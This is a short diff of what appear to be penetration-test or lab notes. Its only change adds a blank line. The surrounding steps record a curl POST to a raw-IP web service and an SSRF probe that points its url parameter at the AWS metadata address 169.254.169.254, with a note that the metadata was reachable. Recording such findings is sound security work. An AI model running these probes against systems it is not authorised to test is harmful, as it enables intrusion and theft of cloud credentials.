@@ -4,6 +4,7 @@
     Command used:  
     `curl -i -X POST "http://54.72.82.22:8804/" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "url=http://example.com"`
     
+    
 2. Probed internal addresses for SSRF (127.0.0.1 and AWS metadata). Confirmed metadata available.  
     Example:  
     `--data-urlencode "url=http://169.254.169.254/latest/meta-data/"`
